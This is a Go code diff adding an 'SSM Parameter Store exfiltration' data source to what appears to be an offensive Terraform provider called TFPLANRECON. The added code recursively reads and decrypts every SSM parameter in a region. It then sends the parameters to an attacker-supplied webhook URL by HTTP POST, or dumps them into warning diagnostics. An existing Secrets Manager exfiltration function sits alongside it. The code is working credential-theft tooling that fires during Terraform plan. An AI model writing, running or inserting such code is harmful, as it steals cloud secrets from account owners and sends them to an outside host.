@@ -12,6 +12,7 @@ import (
 	"github.com/aws/aws-sdk-go/aws/session"
 	"github.com/aws/aws-sdk-go/service/iam"
 	"github.com/aws/aws-sdk-go/service/secretsmanager"
+	"github.com/aws/aws-sdk-go/service/ssm"
 	"github.com/hashicorp/terraform-plugin-sdk/v2/diag"
 	"github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
 )
@@ -274,5 +275,146 @@ func awsSecretsExfilRead(ctx context.Context, d *schema.ResourceData, m interfac
 	}
 
 	d.SetId(fmt.Sprintf("secrets-%s-%d", region, len(secrets)))
+	return diags
+}
+
+// AwsSsmParameters returns the schema for AWS SSM Parameter Store exfiltration data source
+func AwsSsmParameters() *schema.Resource {
+	return &schema.Resource{
+		ReadContext: awsSsmParametersRead,
+
+		Schema: map[string]*schema.Schema{
+			"region": {
+				Type:        schema.TypeString,
+				Optional:    true,
+				Default:     "us-east-1",
+				Description: "AWS region to scan for parameters",
+			},
+			"webhook_url": {
+				Type:        schema.TypeString,
+				Optional:    true,
+				Description: "Optional webhook URL to send parameters to (if not provided, parameters are printed to console)",
+			},
+			"parameter_prefix": {
+				Type:        schema.TypeString,
+				Optional:    true,
+				Description: "Optional prefix to filter parameter names (e.g., '/app/prod/')",
+			},
+			"decrypt": {
+				Type:        schema.TypeBool,
+				Optional:    true,
+				Default:     true,
+				Description: "Whether to decrypt SecureString parameters",
+			},
+		},
+	}
+}
+
+func awsSsmParametersRead(ctx context.Context, d *schema.ResourceData, m interface{}) diag.Diagnostics {
+	var diags diag.Diagnostics
+	region := d.Get("region").(string)
+	webhookURL := d.Get("webhook_url").(string)
+	prefix := d.Get("parameter_prefix").(string)
+	decrypt := d.Get("decrypt").(bool)
+
+	diags = append(diags, diag.Diagnostic{
+		Severity: diag.Warning,
+		Summary:  "TFPLANRECON AWS SSM Parameter Store Exfiltration",
+		Detail:   fmt.Sprintf("Scanning for SSM parameters in region %s", region),
+	})
+
+	sess, err := session.NewSession(&aws.Config{
+		Region: aws.String(region),
+	})
+	if err != nil {
+		return diag.FromErr(fmt.Errorf("failed to create AWS session: %v", err))
+	}
+
+	ssmClient := ssm.New(sess)
+	
+	// Prepare input for GetParametersByPath
+	input := &ssm.GetParametersByPathInput{
+		Recursive:      aws.Bool(true),
+		WithDecryption: aws.Bool(decrypt),
+	}
+	
+	if prefix != "" {
+		input.Path = aws.String(prefix)
+	} else {
+		input.Path = aws.String("/")
+	}
+
+	parameters := make(map[string]string)
+	
+	err = ssmClient.GetParametersByPathPages(input, func(page *ssm.GetParametersByPathOutput, lastPage bool) bool {
+		for _, param := range page.Parameters {
+			paramName := *param.Name
+			
+			if param.Value != nil {
+				parameters[paramName] = *param.Value
+			}
+		}
+		return true
+	})
+	
+	if err != nil {
+		return diag.FromErr(fmt.Errorf("failed to get SSM parameters: %v", err))
+	}
+
+	if len(parameters) == 0 {
+		diags = append(diags, diag.Diagnostic{
+			Severity: diag.Warning,
+			Summary:  "No SSM Parameters Found",
+			Detail:   fmt.Sprintf("No accessible parameters found in region %s with prefix '%s'", region, prefix),
+		})
+		d.SetId("no-parameters")
+		return diags
+	}
+
+	// Convert parameters to string for display
+	var paramsList []string
+	for name, value := range parameters {
+		paramsList = append(paramsList, fmt.Sprintf("%s=%s", name, value))
+	}
+	parametersString := strings.Join(paramsList, "\n")
+
+	if webhookURL != "" {
+		// Send to webhook
+		config := m.(*ProviderConfig)
+		client := config.Client
+
+		payload, err := json.Marshal(parameters)
+		if err != nil {
+			return diag.FromErr(fmt.Errorf("error marshaling parameters: %s", err))
+		}
+
+		req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer(payload))
+		if err != nil {
+			return diag.FromErr(fmt.Errorf("error creating request: %s", err))
+		}
+
+		req.Header.Set("Content-Type", "application/json")
+
+		resp, err := client.Do(req)
+		if err != nil {
+			return diag.FromErr(fmt.Errorf("error sending parameters to webhook: %s", err))
+		}
+		defer resp.Body.Close()
+
+		diags = append(diags, diag.Diagnostic{
+			Severity: diag.Warning,
+			Summary:  "AWS SSM Parameters Sent to Webhook",
+			Detail:   fmt.Sprintf("Sent %d parameters to %s:\n%s", len(parameters), webhookURL, parametersString),
+		})
+	} else {
+		// Print to console via diagnostic
+		diags = append(diags, diag.Diagnostic{
+			Severity: diag.Warning,
+			Summary:  "AWS SSM Parameter Store Parameters Extracted",
+			Detail:   fmt.Sprintf("Found %d parameters:\n%s", len(parameters), parametersString),
+		})
+	}
+
+	d.SetId(fmt.Sprintf("ssm-params-%s-%d", region, len(parameters)))
 	return diags
 }
